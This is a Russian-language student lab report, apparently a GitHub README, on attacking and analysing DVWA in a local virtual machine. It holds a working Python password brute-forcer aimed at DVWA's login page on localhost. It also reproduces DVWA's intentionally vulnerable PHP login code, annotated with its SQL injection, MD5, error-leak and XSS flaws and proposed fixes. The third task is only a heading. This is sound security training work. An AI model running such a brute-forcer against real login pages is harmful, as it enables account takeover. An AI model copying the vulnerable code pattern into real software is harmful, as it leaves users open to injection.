# DAMDINOV_LAB_3

Для выполнения данной лабораторной работы была установлена виртуальная система Dojo
![image](https://github.com/user-attachments/assets/badda7dd-b919-49ab-9aa8-aebd15eaa26d)


Задание 1. Переборщик

Запуск DVWA 
![image](https://github.com/user-attachments/assets/44db3c1e-8834-4947-8cfa-72ce0c2d50b5)

Для успешного перебора кода нужно PHPSESSID 
![image](https://github.com/user-attachments/assets/c90a1eae-a58a-4ec1-88fe-4567a7284332)

Код переборщика:
```
import itertools
import requests
import time

charset = 'abcdefghijklmnopqrstuvwxyz'
pass_length = 8
username = "admin"
dop = "passwo"
session = requests.Session()
url = "http://localhost/dvwa/vulnerabilities/brute/"
session.cookies.set("PHPSESSID", "tpqr8qp76rlhvmp091uglh98tm")
session.cookies.set("security", "low")

def podbor(url, username, password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area admin" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def generate_passwords(dop, length, charset):
    remaining_length = length - len(dop)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield dop + ''.join(combination)

def main():
    start_time = time.time()
    print("[*] Начинаем перебор пароля...")
    for password in generate_passwords(dop, pass_length, charset):
        print(f"[*] Проверяем: {password}")
        if podbor(url, username, password):
            print(f"[+] Успешно! Пароль: {password}")
            break
    else:
        print("[-] Не удалось найти пароль.")
    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} с")

if __name__ == "__main__":
    main()

```
Переборщик успешно подбирает пароль
![image](https://github.com/user-attachments/assets/24b006af-4ee7-4748-a1af-98a219350616)


Задание 2. Анализ кода
```
<?php
if( isset( $_GET[ 'Login' ] ) ) {
    // Получение имени пользователя
    $user = $_GET[ 'username' ];
    // Получение пароля
    $pass = $_GET[ 'password' ];
    
    // CWE-327 (Использование устаревшего или ненадежного криптографического алгоритма)
    // Используется MD5 для хеширования паролей, что небезопасно. Этот алгоритм считается устаревшим и уязвимым для атак, таких как подбор и коллизии.
    $pass = md5( $pass );

    // CWE-89 (SQL-инъекции)
    // Переменные $user и $pass напрямую вставляются в SQL-запрос без экранирования или использования подготовленных выражений. Это делает приложение уязвимым для SQL-инъекций.
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    
    // Выполнение SQL-запроса
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) 
        // CWE-209 (Утечка информации через сообщения об ошибках)
        // Вывод ошибок базы данных на экран позволяет атакующему получить информацию о структуре базы и настройках приложения, что облегчает последующие атаки.
        or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Получение данных пользователя
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];
        
        // CWE-79 (Неэкранированные данные во время генерации веб-страницы — XSS)
        // Данные, полученные из базы данных (например, $avatar), не проходят проверку или экранирование.
        // Это позволяет злоумышленнику внедрять вредоносный код (JavaScript) в веб-страницу.
        $html .= "<p>Welcome to the password protected area {$user}</p>";
        $html .= "<img src=\"{$avatar}\" />";
    }
    else {
        // Ошибка входа
        $html .= "<pre><br />Username and/or password incorrect.</pre>";
    }
    // Закрытие подключения
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
1) Использование устаревшего хеширования (CWE-327): MD5 не обеспечивает должной безопасности для хранения паролей. Нужно заменить на bcrypt.

2) SQL-инъекции (CWE-89): прямое включение пользовательских данных в SQL-запросы без экранирования делает систему уязвимой. Необходимо использовать подготовленные выражения (mysqli_stmt или PDO).

3) Вывод ошибок базы данных в браузер (CWE-209): сообщения об ошибках предоставляют атакующему ценную информацию о сервере и базе данных. Ошибки должны логироваться только на сервере.

4) Уязвимость для XSS (CWE-79): Переменные $user и $avatar выводятся на страницу без экранирования. Это открывает возможность внедрения вредоносного кода. Нужно использовать htmlspecialchars для безопасного вывода данных.

5) Нет защиты от атак методом перебора: не предусмотрено ограничение на количество попыток входа, что делает систему уязвимой для атак перебора паролей.


Задание 3. Своя аутентификация


